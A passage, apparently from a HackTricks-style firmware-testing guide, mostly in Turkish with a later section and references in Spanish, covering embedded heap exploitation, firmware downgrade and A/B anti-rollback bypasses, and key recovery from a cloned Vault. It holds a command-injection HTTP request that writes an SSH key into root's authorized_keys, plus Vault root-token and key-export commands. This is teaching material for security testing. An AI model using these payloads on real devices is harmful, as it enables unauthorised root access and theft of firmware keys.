Embedded daemon'larda heap metadata exploitation'ı tetiklemenin en kolay yolu genellikle "cleanup'ı beklemek" değil, **protocol'ün kendi error handling mekanizmasını zorlamaktır**:<sup>[[8]](#references)</sup>

- FSM'i **retry** veya **error** state'lerine geçirmek için hatalı follow-up fragment'ler gönderin.
- Retry eşiğini aşarak daemon'ın **context'i sıfırlayıp** bozulmuş buffer'ı serbest bırakmasını sağlayın.
- Process ilgisiz nedenlerle çökmden önce allocator tarafındaki primitive'leri tetiklemek için bu öngörülebilir `free()` çağrısını kullanın.

Bu yaklaşım, özellikle embedded Linux'taki **musl/uClibc/dlmalloc benzeri** allocator'lara karşı kullanışlıdır; chunk metadata'sını bozmak, unlink/unbin mantığını bir write primitive'e dönüştürebilir. Kararlı bir yöntem, gerçek bin pointer'larını hemen bozup process'i çökertmek yerine, allocator traversal'ını **taşırılmış buffer içinde hazırlanmış fake chunk**'lara yönlendirmek için bir **size field**'ı bozmaktır.

## Binary Exploitation ve Proof-of-Concept

Belirlenen zafiyetler için bir PoC geliştirmek, hedef mimarinin derinlemesine anlaşılmasını ve daha düşük seviyeli dillerde programlama yapmayı gerektirir. Embedded sistemlerde binary runtime protection'lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekebilir.

### uClibc fastbin exploitation notları (embedded Linux)

- **Fastbin'ler + birleştirme:** uClibc, glibc'ye benzer fastbin'ler kullanır. Daha sonraki büyük bir allocation `__malloc_consolidate()` işlevini tetikleyebilir; bu nedenle fake chunk, kontrollerden geçebilmelidir (makul bir size, `fd = 0` ve çevredeki chunk'ların "in use" olarak görülmesi).<sup>[[6]](#references)</sup>
- **ASLR altında non-PIE binary'ler:** ASLR etkin ancak ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation'ını **function pointer table**'a yönlendirmek için zaten geçerli bir heap chunk header'ına benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser'ı durduran NUL:** JSON parse edilirken payload içindeki bir `\x00`, trailing saldırgan kontrollü byte'ları stack pivot/ROP chain için kullanılabilir durumda tutarken parsing'i durdurabilir.
- **`/proc/self/mem` ile shellcode:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP chain, çalıştırılabilir shellcode'u bilinen bir mapping'e yerleştirip oraya atlayabilir.

## Firmware Analysis için Hazırlanmış İşletim Sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, firmware security testing için gerekli araçlarla donatılmış, önceden yapılandırılmış ortamlar sağlar.

## Firmware'i analiz etmek için Hazırlanmış OS'ler

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarında security assessment ve penetration testing yapmanıza yardımcı olmak üzere tasarlanmış bir distro'dur. Gerekli tüm araçların yüklü olduğu önceden yapılandırılmış bir ortam sunarak size önemli ölçüde zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing işletim sistemi.

## Firmware Downgrade Attacks ve Güvensiz Update Mechanism'leri

Bir üretici firmware image'ları için cryptographic signature check uygulasa bile **version rollback (downgrade) protection** sıklıkla atlanır. Boot- veya recovery-loader, yalnızca embedded public key ile signature'ı doğruluyor ancak yüklenen image'ın *version* değerini (veya monotonic counter'ı) karşılaştırmıyorsa, saldırgan geçerli bir signature taşıyan **daha eski ve savunmasız bir firmware'i** meşru şekilde yükleyebilir ve böylece giderilmiş zafiyetleri yeniden ortaya çıkarabilir.<sup>[[4]](#references)</sup>

Tipik saldırı iş akışı:

1. **Daha eski, imzalı bir image edinin**
   * Üreticinin herkese açık indirme portalından, CDN'inden veya destek sitesinden alın.
   * Companion mobile/desktop application'lardan çıkarın (ör. Android APK içindeki `assets/firmware/` dizininden).
   * VirusTotal, Internet archive'ları, forumlar vb. gibi üçüncü taraf depolarından alın.
2. Image'ı herhangi bir açık update channel üzerinden cihaza **yükleyin veya sunun**:
   * Web UI, mobile-app API, USB, TFTP, MQTT vb.
   * Birçok consumer IoT cihazı, Base64 kodlu firmware blob'larını kabul eden, bunları server-side decode eden ve recovery/upgrade işlemini başlatan *kimlik doğrulamasız* HTTP(S) endpoint'leri sunar.
3. Downgrade sonrasında, daha yeni sürümde giderilmiş bir zafiyeti exploit edin (örneğin sonradan eklenen bir command-injection filter'ı).
4. İsteğe bağlı olarak persistence sağladıktan sonra tespit edilmemek için en güncel image'ı yeniden yükleyin veya update'leri devre dışı bırakın.

### Örnek: Downgrade Sonrası Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Güvenlik açığı bulunan (daha eski sürüme düşürülmüş) firmware'de `md5` parametresi herhangi bir temizleme işleminden geçirilmeden doğrudan bir shell komutuna eklenir ve böylece keyfi komutların enjekte edilmesine olanak tanır (burada SSH anahtarı tabanlı root erişimi etkinleştiriliyor). Daha sonraki firmware sürümlerinde temel bir karakter filtresi eklendi, ancak sürüm düşürme korumasının olmaması düzeltmeyi etkisiz kılıyor.<sup>[[4]](#references)</sup>

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için tam firmware imajlarını eşlikçi mobil uygulamalarına ekler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmeden saklanır. `apktool`, `ghidra` veya `unzip` gibi araçlar, fiziksel donanıma dokunmadan imzalı imajları çıkarmanıza olanak tanır.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot tasarımlarında yalnızca updater üzerinden uygulanan anti-rollback bypass

Bazı vendor'lar bir anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığı içinde yapar (örneğin CAN üzerinden bir UDS routine, bir recovery command veya bir userspace OTA agent). **Bootloader** daha sonra yalnızca image signature/CRC kontrolü yapıp partition table'a veya slot metadata'sına güveniyorsa rollback protection yine bypass edilebilir.<sup>[[7]](#references)</sup>

Yaygın zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonik counter içerir.
- Updater, image ratchet değerini persistent storage'da saklanan bir değerle karşılaştırır ve daha eski imzalı image'ları reddeder.
- Bootloader bu ratchet'i **parse etmez**; boot etmeden önce yalnızca header, CRC ve signature doğrulaması yapar.
- Slot activation, partition table'da veya slot başına bir generation counter ile ayrı olarak saklanır ve doğrulanan firmware digest'ine **cryptographically bound değildir**.

Bu, dual-slot sistemlerde bir **bir image'ı doğrula / başka bir image'ı boot et** primitive'i oluşturur. Saldırgan updater'a güncel imzalı bir image kullanarak slot B'yi bir sonraki boot hedefi olarak işaretletebilir ve daha sonra reboot etmeden önce slot B'nin üzerine yazabilirse, bootloader yalnızca önceden commit edilmiş slot metadata'sına güvendiğinden downgraded image'ı yine boot edebilir.

Yaygın abuse pattern:

1. **Güncel imzalı** bir firmware'i pasif slota yükleyin ve layout'un bu slotu bir sonraki aktif slot olarak işaretlemesi için normal validation/switch routine'ini çalıştırın.
2. **Henüz reboot etmeyin**. Aynı session içinde slot hazırlama/silme routine'ine yeniden girin.
3. Updater'ın az önce etkinleştirilen **aynı fiziksel slotu** silmesi için stale boot-state veya stale slot-selection mantığından yararlanın.
4. Bu slota **daha eski ama hâlâ imzalı** bir firmware yazın.
5. Ratchet'i uygulayan validation routine'ini atlayın ve doğrudan reboot edin.
6. Bootloader etkinleştirilmiş slotu seçer, yalnızca signature/integrity kontrolü yapar ve eski image'ı boot eder.

A/B update implementasyonlarını reverse ederken dikkat edilmesi gerekenler:

- Slot seçiminin, başarılı bir switch işleminden sonra yenilenmeyen **boot-time flags** üzerinden yapılması.
- **Güncel commit edilmiş layout** yerine stale state'e göre slot silen `prepare_passive_slot()` benzeri bir routine.
- Doğrulanmış image hash'ini saklamak yerine yalnızca **generation counter** / active flag değerini artıran `part_write_layout()` benzeri bir function.
- Userspace veya updater code içinde uygulanan, ancak ROM / bootloader / secure boot aşamalarında **uygulanmayan** ratchet kontrolleri.
- İçeriği silinip yeniden yazıldıktan sonra slotu bootable olarak işaretli bırakan erase veya recovery routine'leri.

### Update Logic Değerlendirme Checklist'i

* *Update endpoint*'in transport/authentication mekanizması yeterince korunuyor mu (TLS + authentication)?
* Cihaza flashing öncesinde **version number** veya **monotonik anti-rollback counter** karşılaştırması yaptırılıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. signature'lar ROM code tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca signature/CRC kontrolü yapmak yerine updater ile aynı ratchet'i uyguluyor mu?
* Slot activation metadata'sı **doğrulanmış firmware digest/version değerine bağlı mı**, yoksa slot etkinleştirildikten sonra değiştirilebilir mi?
* Slot switch başarıyla tamamlandıktan sonra cihaz zorunlu olarak reboot ediyor mu, yoksa aynı session içinde sonraki update/erase routine'lerine hâlâ erişilebiliyor mu?
* Userland code ek sanity check'ler yapıyor mu (ör. izin verilen partition map, model number)?
* *Partial* veya *backup* update flow'ları aynı validation logic'i yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback attack'lerine karşı savunmasızdır.

## Pratik yapmak için vulnerable firmware

Firmware'deki vulnerabilities'leri keşfetme pratiği yapmak için aşağıdaki vulnerable firmware projelerini başlangıç noktası olarak kullanın.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state içinden firmware decryption key'lerini kurtarma

Bir update image az miktarda plaintext metadata'yı büyük, yüksek entropili bir blob ile birleştiriyorsa herhangi bir brute-force denemeden önce container triage yapın:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` ve `binwalk -E` ile header'ları, offset'leri ve satır sınırlarını dökün.
- `Salted__` genellikle OpenSSL `enc` formatı anlamına gelir: sonraki 8 byte salt, kalan byte'lar ise ciphertext'tir.
- Tam olarak `256` byte'a decode olan bir Base64 field, muhtemelen rastgele bir firmware password/session key'i sarmalayan bir RSA-2048 ciphertext'e baktığınıza dair güçlü bir ipucudur.
- Aynı dosyadaki detached PGP materyali genellikle yalnızca authenticity'yi korur; bunun confidentiality mekanizması olduğunu varsaymayın.

Static key hunting (`grep`, `strings`, PEM/PGP aramaları) başarısız olursa yalnızca private key'leri aramak yerine **operational decrypt path**'i reverse edin:

- Updater / management binary'sini decompile edin ve encrypted blob'u kimin okuduğunu, hangi helper/API'nin blob'u açtığını ve hangi logical key name'i istediğini izleyin.
- KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) ile unit file'ları ve init script'leri için extracted root filesystem'i arayın.
- Plaintext `vault operator unseal ...`, recovery key'leri, bootstrap token'ları veya yerel KMS auto-unseal script'lerini private-key materyaliyle eşdeğer olarak değerlendirin.

Appliance orijinal Vault binary'sini ve storage backend'ini içeriyorsa bu ortamı yeniden çalıştırmak genellikle Vault internals'ı yeniden uygulamaktan daha kolaydır:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con el usuario root en el KMS clonado:

- Haz que las claves transit se puedan exportar solo dentro del clon aislado: `vault write transit/keys/<name>/config exportable=true`
- Exporta la clave de unwrap: `vault read transit/export/encryption-key/<name>`
- Prueba la clave RSA recuperada con el par exacto de padding/hash que usa el KMS. Un fallo al descifrar con PKCS#1 v1.5 y otro con el descifrado OAEP predeterminado **no** demuestran que la clave sea incorrecta; muchos flujos respaldados por Vault usan OAEP con SHA-256, mientras que las bibliotecas comunes usan SHA-1 de forma predeterminada.
- Si el payload empieza por `Salted__`, reproduce exactamente el KDF de OpenSSL del proveedor (`EVP_BytesToKey`, a menudo MD5 en dispositivos heredados) antes de intentar descifrar con AES-CBC.

Esto convierte el «firmware cifrado» en un problema más general: **recuperar las claves operativas del dispositivo y, después, reproducir sin conexión los parámetros exactos de unwrap + KDF**.

## Formación y certificaciones

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking Firmware with Claude: Habilidad de nivel sénior, autonomía de nivel júnior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodología de pruebas de seguridad de firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: La guía definitiva para atacar el Internet de las cosas](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Explotación de zero-days en hardware abandonado – Blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Cómo un dispositivo inteligente de 20 dólares me dio acceso a tu casa](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ahora me ves: ahora estás comprometido](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Explotación del Tesla Wall Connector desde su conector del puerto de carga - Parte 2: omisión de la protección contra downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Haz que parpadee: explotación over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS en QEMU, parte 2: depuración y reparación](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Contraseñas del BIOS de Dell: el cifrado XOR débil permite recuperarlas desde la memoria SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn - Herramientas para recuperar contraseñas del BIOS de Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
